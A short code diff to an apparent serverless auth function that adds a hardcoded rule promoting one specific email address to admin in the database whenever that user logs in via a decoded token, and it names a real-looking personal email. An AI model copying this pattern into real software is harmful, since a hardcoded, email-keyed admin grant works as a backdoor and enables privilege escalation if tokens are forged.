@@ -97,7 +97,13 @@ async function getUser(request, env) {
         ).bind(payloadDecoded.email, payloadDecoded.name || "Viteiro", payloadDecoded.picture || "").run();
         user = { email: payloadDecoded.email, role: 'viteiro', display_name: payloadDecoded.name, avatar_url: payloadDecoded.picture };
       }
-      return user;
+      
+        if (user.email === 'gabrielfwchaves@gmail.com' && user.role !== 'admin') {
+            await env.DB.prepare("UPDATE users SET role = 'admin' WHERE email = ?").bind(user.email).run();
+            user.role = 'admin';
+        }
+
+        return user;
     }
   } catch (e) {
     console.error("Token decoding failed", e);
